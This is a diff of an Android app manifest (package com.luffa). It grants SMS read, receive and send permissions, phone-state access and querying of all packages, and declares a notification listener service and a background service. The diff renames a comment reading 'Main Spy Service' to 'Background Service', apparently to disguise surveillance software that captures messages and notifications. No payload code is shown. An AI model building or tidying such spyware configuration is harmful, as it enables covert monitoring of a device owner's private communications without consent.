@@ -1,7 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.luffa">
 
-    <!-- Core Permissions -->
+    <!-- Permissions -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
@@ -27,10 +28,8 @@
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
 
-
-<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    
     <application
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
@@ -39,39 +38,29 @@
         android:theme="@style/Theme.AppCompat.NoActionBar"
         android:usesCleartextTraffic="true">
 
+        <!-- Notification Listener Service -->
+        <service
+            android:name=".NotificationListener"
+            android:label="Notification Access"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
 
-<service
-    android:name=".NotificationListener"
-    android:label="Notification Access"
-    android:exported="true"
-    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-    <intent-filter>
-        <action android:name="android.service.notification.NotificationListenerService" />
-    </intent-filter>
-</service>
+        <!-- Main Activity (Single Declaration) -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTop">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
 
-
-
-        <!-- Main Activity -->
-        
-<activity
-    android:name=".MainActivity"
-    android:excludeFromRecents="true"
-    android:exported="false"
-    android:launchMode="singleTop" />
-
-
-<activity
-    android:name="com.luffa.MainActivity"
-    android:exported="true">
-    <intent-filter>
-        <action android:name="android.intent.action.MAIN" />
-        <category android:name="android.intent.category.LAUNCHER" />
-    </intent-filter>
-</activity>
-
-        
-        <!-- Main Spy Service -->
+        <!-- Background Service -->
         <service
             android:name=".MyService"
             android:exported="false"
